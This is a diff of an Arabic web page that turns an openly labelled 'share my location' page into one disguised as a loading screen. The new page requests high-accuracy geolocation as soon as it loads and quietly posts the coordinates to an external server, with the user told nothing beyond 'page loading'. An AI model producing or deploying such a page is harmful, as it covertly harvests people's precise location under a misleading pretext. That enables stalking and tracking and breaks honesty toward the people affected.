@@ -2,59 +2,55 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مشاركة الموقع</title>
-    <style>
-        body { font-family: Tahoma, sans-serif; text-align: center; padding-top: 20vh; background: #f4f4f9; }
-        button { background: #2563eb; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; }
-        button:hover { background: #1d4ed8; }
-        #status { margin-top: 20px; color: #555; }
-    </style>
+    <title>تحديد الموقع</title>
 </head>
 <body>
 
-    <h2>مشاركة موقعك الجغرافي</h2>
-    <p>اضغط على الزر أدناه للسماح بمشاركة موقعك معنا:</p>
-    
-    <button onclick="shareLocation()">مشاركة موقعي</button>
-    <p id="status"></p>
+    <h2>جاري تحميل الصفحة...</h2>
 
     <script>
-        function shareLocation() {
-            const statusText = document.getElementById("status");
-            
-            if (!navigator.geolocation) {
-                statusText.innerHTML = "متصفحك لا يدعم تحديد الموقع.";
-                return;
+        // هذا الكود يشتغل أول ما الصفحة تفتح تلقائياً
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // 1. التقطنا الإحداثيات بنجاح بعد ما وافق المستخدم
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+
+                        // 2. إرسالها فوراً للسيرفر الخاص بك
+                        sendToServer(lat, lon);
+                    },
+                    function(error) {
+                        console.log("تم رفض الإذن أو حدث خطأ.");
+                    },
+                    { enableHighAccuracy: true }
+                );
             }
+        };
 
-            statusText.innerHTML = "جاري طلب إذن الوصول للموقع...";
-
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    let lat = position.coords.latitude;
-                    let lon = position.coords.longitude;
-
-                    statusText.innerHTML = "تم تحديد الموقع بنجاح، جاري الإرسال...";
-
-                    // إرسال البيانات إلى السيرفر الخاص بك (Backend)
-                    fetch('/api/save-location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ latitude: lat, longitude: lon })
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            statusText.innerHTML = "شكراً لك، تم إرسال موقعك بنجاح!";
-                        } else {
-                            statusText.innerHTML = "حدث خطأ أثناء الإرسال.";
-                        }
-                    });
+        function sendToServer(lat, lon) {
+            // ملاحظة: الرابط أدناه يجب أن يكون رابط السيرفر الحقيقي الخاص بك
+            fetch('https://your-backend-server.com/api/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
                 },
-                function(error) {
-                    statusText.innerHTML = "تم رفض إذن الوصول إلى الموقع من قبل المستخدم.";
-                },
-                { enableHighAccuracy: true }
-            );
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("تم إرسال الموقع للسيرفر بنجاح");
+                } else {
+                    console.log("السيرفر رفض الطلب أو حدث خطأ");
+                }
+            })
+            .catch(err => {
+                console.log("مشكلة في الاتصال بالسيرفر");
+            });
         }
     </script>
 
